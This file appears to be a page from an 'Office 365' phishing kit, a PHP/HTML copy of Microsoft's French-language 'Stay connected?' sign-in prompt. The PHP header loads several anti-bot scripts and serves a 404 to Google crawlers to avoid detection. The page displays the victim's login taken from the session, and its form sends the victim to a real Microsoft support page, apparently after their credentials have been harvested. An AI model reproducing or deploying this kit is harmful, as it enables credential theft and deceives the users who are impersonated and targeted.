﻿<?php
/*
***********************************************************
*                                                         *
*             Office 365 v1.8.3                                *
*                     For More :  someone@example.com     *
*                                [+] Office 365 v1.8.3    *
*                                                         *
*             Office 365 v1.8.3                *
*                                                         *
***********************************************************
*/
session_start();
include "./FUNC/antibots1.php";
include "./FUNC/antibots2.php";
include "./FUNC/antibots3.php";
include "./FUNC/antibots4.php";
include "./FUNC/antibots5.php";
include "./FUNC/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Connectez-vous à votre compte</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="KmsiInterrupt">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1036">
    <meta name="LocLC" content="fr-FR">
    <link rel="shortcut icon" href="./css/a.ico">
    <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">    
    <meta name="robots" content="none">
<link href="./css/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --><!-- /ko --><!-- ko if: backgroundImageUrl --><!-- /ko --><!-- ko if: !!backgroundImageUrl() --><!-- /ko --> </div></div> <form novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="https://support.office.com/en-us/article/-something-went-wrong-error-when-you-try-to-start-an-office-app-4b4471dd-cf86-4a37-910d-35a01a6c7d17"><!-- ko withProperties: { '$kmsiPage': $data } --> <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            handleWizardButtons: false,
            useWizardBehavior: svr.fUseWizardBehavior } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <div class="middle app" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }"><!-- ko if: $kmsiPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div class="background-logo-holder"> <img class="background-logo" role="presentation" data-bind="attr: { src: $kmsiPage.backgroundLogoUrl() }" src="./login 3_files/bannerlogo"> </div><!-- /ko --> <div class="inner" data-bind="css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div data-bind="component: { name: &#39;logo-control&#39;, params: { isChinaDc: svr.fIsChinaDc, bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="./login 3_files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: showErrorDetails --><!-- /ko --> <div data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: 20 },
                        event: {
                            showView: $kmsiPage.view_onShow } }"><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="20" data-bind="pageViewComponent: { name: &#39;kmsi-view&#39;,
                        params: {
                            serverData: svr },
                        event: {
                            submitReady: $kmsiPage.view_onSubmitReady } }"><!--  --> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
    params: {
        pawnIconId: svr.iPawnIcon,
        userTileUrl: svr.urlProfilePhoto,
        displayName: svr.sPOST_Username } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="eli.badjii@gmail.com"><?php echo $_SESSION['_L']; ?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --> <div class="profile-photo"> <img role="presentation" data-bind="attr: { src: getUrl() }" src="./login 3_files/picker_account_aad.svg"> </div><!-- /ko --> </div></div> <input type="hidden" name="LoginOptions" data-bind="value: loginOptions" value="0"> <input type="hidden" name="ctx" data-bind="value: svr.sCtx" value="rQIIAX2SO2_TUACF46SNWlQBYmIAqQMTkhM78SsRlUhs18SO7TR1kjpL5NjXiePrR5zrOI2Y-AVdQUywdWDogBBqJ8TSqTMDEoxMiImR5g8gHZ3pm875nhbIEll_UqNspuoCFyerVhWn2LGNcwRL4SxtuZzN0BzHWsmDO_dfNl5_fyZ9lV_ttaZn7Q_sOfZ4ilC8qJfLoRWUHACXoBS5rmeDkh0F5U8YdoNh5_kFU2VohmFqtQpBbkKxJV3wM9UwKU3qIdOAcHhMEOYaTtsDOVAHLaRLKmHOREITWpkWtFaqAYOhJK504QgNhQah8hte89sDkdIFFamCX9EMldKE_oYjv-Xv6Y0UTSubihJvDf7kd90oCUZxtEBvCld5PQZhy-GjMAQ2Km0wECLPtpAXhZ0kikGCPLA4UCJvrhNM0DAEE0wUljaULst2T7J2b92KLbVJKy3cn5_2251kLQ3Vtob4LkilmMFbMJw77rTxIgpX8aQrBWnDCVfhdHnY1psrHsbran9GxcBcJpkzYY5Zq9cxkGhMJWmQykLAq2aHn1mryYDDTZey-6oRE6DLigsbz0LF6fIkni6Vyjgx-sAkR0tZptiVyum1GCpGAv2u0mtbmj9YjxLpKMs6zZmcCcLhWNZGEtCHwzkanYSjnmpzQQqZ3vJkpvdS4dBkaW8t9xjbbfKJOArddSg1hESwwCm0Ut_3mKOLQvH24SAKrwt3b6cKPWc_TiLXg-Bn4VE89SBKrFMYJc8hWAJoJwD49mIjxc0W9mtrjyjUd3aK97GHuf3c3y3s3fatXdHF2y8ffzTEq8tLWH4v5q63ywtmvADIT_mBDrWsC2nHCXw6MioBnIiBYhMmI_MWWRU63AFdJ8-K2Fmx-LuY-7z7fzH_AQ2"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="36bea517-e875-4e97-aaee-3217062b4800"> <input type="hidden" data-bind="attr: { name: svr.sFTName  }, value: svr.sFT" name="flowToken" value="AQABAAEAAABHh4kmS_aKT5XrjzxRAtHz5Dz-545rMpo4OMuxHCVuimayeEL_AKCjvLIV7PCTR-mGz4yRUkmwAxiKKxH1xMis5g7TvLQXwMJf_5lobdUDH05IlzPGelA2eSswb-WUHGEzlvQ6M9r4jbUXkD6oL1XzHxo6oV9uhsOtK0KTJV7nYoS5Ne0R50UjltodvJuM1EQIl-M8pUuvKUl5ocjGB8IJi0aAuPIQRwu5c1ZHOA_CW4phg3XwCHe_qhdRsV185UVvaExpxBXPVKeVKMEFpBvMgQK_tnOUIbVauE4tGl5ZrWR7_2SyfMv99k1aab0ZuKeEfZIIbB7VpmSHo80ySb44QquyCGkrSR0yHh2GGt6zBo0Q9xPZDW18kDYpgGKuycvy9DqE8XB85U0-KajeakEw_lO4FKAIfOPBQmu6HW96xltVL-VGYx6noXpSwk3_F7WIlooh9neWESfQa3sARwEx-ygsQpC3OTtaAHHVFChoWT2LHc0bmrnX5-KNvaK0JEPfNPS-DlyJyzfqN6OCz7qo8tDrhFoHrw8mu8i_5c2CBiWgMVFY1BXakyJt4fNJXH7BVk_k_Kk2Qk9c-uAhSWdphkFHpmQEIAcM8s9SQUTepiAA"> <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.apiCanary" name="canary" value="s6bsetkuCWOlNwRl5ddmk5oT2mlgEmKc0Y6JCa13DP8=2:1"> <div class="row text-title" role="heading" data-bind="text: str[&#39;STR_Kmsi_Title&#39;]">Stay connected&nbsp;?</div> <div class="row text-body"> <p id="KmsiDescription" class="text-block-body overflow-hidden no-margin-top" data-bind="text: str[&#39;STR_Kmsi_Description&#39;]">This allows you to reduce the number of times you are prompted to log on.</p> </div> <div data-bind="invertOrder: svr.fRepositionFooterButtons"> <div class="row"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;STR_Kmsi_Accept_Kmsi&#39;],
            secondaryButtonText: str[&#39;STR_Kmsi_Decline_Kmsi&#39;],
            focusOnPrimaryButton: true,
            primaryButtonDescribedBy: &#39;KmsiDescription&#39; },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { &#39;no-margin-bottom&#39;: removeBottomMargin, &#39;button-container&#39;: svr.fRepositionFooterButtons }"> <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 secondary&#39;: isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                &#39;id&#39;: secondaryButtonId || &#39;idBtn_Back&#39;,
                &#39;aria-describedby&#39;: secondaryButtonDescribedBy },
            value: secondaryButtonText() || str[&#39;CT_HRD_STR_Splitter_Back&#39;],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="No"> </div> <div data-bind="
            css: {
                &#39;inline-block&#39;: svr.fRepositionFooterButtons,
                &#39;col-xs-12 primary&#39;: isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
                &#39;col-xs-24&#39;: !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="col-xs-12 primary"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                &#39;id&#39;: primaryButtonId || &#39;idSIButton9&#39;,
                &#39;aria-describedby&#39;: primaryButtonDescribedBy },
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" aria-describedby="KmsiDescription" value=Yes> </div> </div></div> </div> <div class="row"> <div class="col-md-24 form-group checkbox"> <label> <input id="KmsiCheckboxField" name="DontShowAgain" type="checkbox" value="true" data-bind="ariaLabel: str[&#39;STR_Kmsi_DontShowAgain&#39;]" aria-label="Do not show this message again
"> <span data-bind="text: str[&#39;STR_Kmsi_DontShowAgain&#39;]"> Do not show this message again</span> </label> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value=""> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- /ko --> <div id="footer" class="footer"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                moreInfoClick: footer_onShowDebugDetails } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/fr-FR/servicesagreement/">Conditions d'utilisation</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/fr-FR/privacystatement">Confidentialité et cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="https://login.microsoftonline.com/common/login#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;], attr: { title: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;] }" aria-label="Cliquez ici pour d&#39;autres options" title="Cliquez ici pour d&#39;autres options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="./login 3_files/ellipsis_white.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7362.11/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="./login 3_files/ellipsis_grey.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div> <!-- /ko --></div> </div> </form></div></body></html>